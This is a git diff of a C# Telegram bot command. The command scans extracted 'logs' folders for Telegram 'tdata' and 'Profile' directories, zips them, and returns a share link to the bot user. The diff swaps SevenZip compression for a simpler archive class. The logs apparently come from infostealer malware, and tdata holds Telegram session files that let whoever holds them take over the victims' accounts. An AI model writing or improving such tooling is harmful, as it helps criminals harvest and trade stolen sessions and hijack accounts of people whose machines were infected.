@@ -1,5 +1,5 @@
 using System.Text;
-using SevenZip;
+using Core.Models;
 using TelegramBot.Extensions;
 using TelegramBot.Models;
 using TelegramBot.Services;
@@ -27,22 +27,11 @@ public class TelegramServiceCommand(Client client, DataService data, Random rand
         var logspath = data.GetExtractedPath(logsname);
         var zippath = data.CreateZipPath(logsname, name: "Telegram");
 
-        var zip = new SevenZipCompressor
-        {
-            EventSynchronization = EventSynchronizationStrategy.AlwaysAsynchronous,
-            CompressionMode = CompressionMode.Create,
-            ArchiveFormat = OutArchiveFormat.Zip,
-            CompressionMethod = CompressionMethod.Lzma2,
-            EncryptHeaders = true,
-            DirectoryStructure = true,
-            PreserveDirectoryRoot = true
-        };
+        await client.EditMessageText(user, update.msg_id, $"Telegram\nParsing from {logsname}");
 
-        var logs = Directory.GetDirectories(logspath);
-        var index = 0;
-        var created = false;
+        var zip = new ZipArchive(zippath);
 
-        foreach (var log in logs)
+        foreach (var log in Directory.GetDirectories(logspath))
         {
             var telegrampath = Directory.GetDirectories(log, "Telegram", SearchOption.AllDirectories).FirstOrDefault();
 
@@ -55,27 +44,8 @@ public class TelegramServiceCommand(Client client, DataService data, Random rand
                              return name.StartsWith("Profile") || name.StartsWith("tdata");
                          }))
             {
-                if (Directory.GetFiles(tdata).Length == 0) continue;
-                
-                if (created) zip.CompressionMode = CompressionMode.Append;
-                
-                int namestart = tdata.LastIndexOf('\\'), nameendindex = tdata[namestart..].IndexOf(' ');
-                var newdir = tdata[..(namestart + (nameendindex == -1 ? tdata.Length - namestart : nameendindex))] + $" ({index})";
-                
-                if (!Directory.Exists(newdir)) Directory.Move(tdata, newdir);
-
-                index++;
-
-                await zip.CompressDirectoryAsync(newdir, zippath);
-                created = true;
+                await zip.AddDirectoryAsync(tdata);
             }
-        }
-
-        if (!File.Exists(zippath))
-        {
-            await client.Messages_SendMessage(user, $"Telegram in {logsname} not found", random.NextInt64());
-            
-            return;
         }
 
         await client.Messages_SendMessage(user, $"{logsname}\n{await data.GetShareLinkAsync(zippath)}", random.NextInt64(), clear_draft: true);
